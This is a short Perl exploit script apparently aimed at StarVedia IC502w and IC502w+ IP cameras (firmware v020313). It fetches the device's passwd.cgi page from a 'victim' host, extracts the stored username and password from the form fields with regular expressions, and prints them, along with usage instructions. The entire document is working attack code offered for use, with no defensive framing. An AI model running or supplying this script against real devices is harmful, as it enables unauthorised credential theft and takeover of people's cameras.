use LWP::Simple;
if (@ARGV == 0) {&usg;}
while (@ARGV > 0) {
$type = shift(@ARGV);
$t = shift(@ARGV);
}
if ($type eq "-d") {
my $r = get("http://$t/cgi-bin/passwd.cgi?") or die(" $t: Not vulneruble, $!\n");
print " [+] StarVedia IPCamera IC502w IC502w+ v020313 remote bypass username/password disclosure exploit\n";
print " [!] Exploiting: $t\n";
if ($r =~ m/<INPUT type=text name=user size=20 maxlength=19 value="(.*)">/g) {
$result .= "   [o] User: $1\n";
}else{die(" Try another exploit, $!");}     
if ($r =~ m/<INPUT type=password name=passwd size=20 maxlength=19 value="(.*)">/g){
$result .= "   [o] Password: $1\n";
}else{die("Try another exploit or restart the exploit\n");}
sleep(1);
print " [\\m/] BINGO!!!\n\a".$result; 
}
sub usg(){
print " [!] usg: perl $0 [-r or -d] <victim:port>\n";
print " [!]  -d: disclosure password option\n";
print " [!] exp: perl $0 -d 127.0.0.1 :)\n";
exit;
}

